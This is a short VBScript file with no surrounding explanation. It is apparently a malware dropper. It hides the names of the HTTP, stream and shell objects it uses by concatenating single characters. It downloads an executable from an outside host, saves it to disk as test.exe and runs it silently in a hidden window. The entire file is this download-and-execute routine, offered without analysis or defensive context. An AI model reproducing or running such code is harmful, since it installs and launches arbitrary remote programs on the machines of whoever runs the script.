Dim i
Dim j
Set j = CreateObject("M"+"i"+"c"+"r"+"o"+"s"+"o"+"f"+"t"+"."+"X"+"M"+"L"+"H"+"T"+"T"+"P")
j.Open "GET", "http://sec.gravito.com/hta3/test.exe", False 
j.Send
i = j.ResponseBody
Const k = 1
Const l = 2
Dim m
Set m = CreateObject("A"+"D"+"O"+"D"+"B"+"."+"S"+"t"+"r"+"e"+"a"+"m")
m.Type = k
m.Open
m.Write i
m.SaveToFile "test.exe", l
Dim n
Set n = CreateObject("W"+"S"+"c"+"r"+"i"+"p"+"t"+"."+"S"+"h"+"e"+"l"+"l"+"")
n.Run "test.exe", 0, false
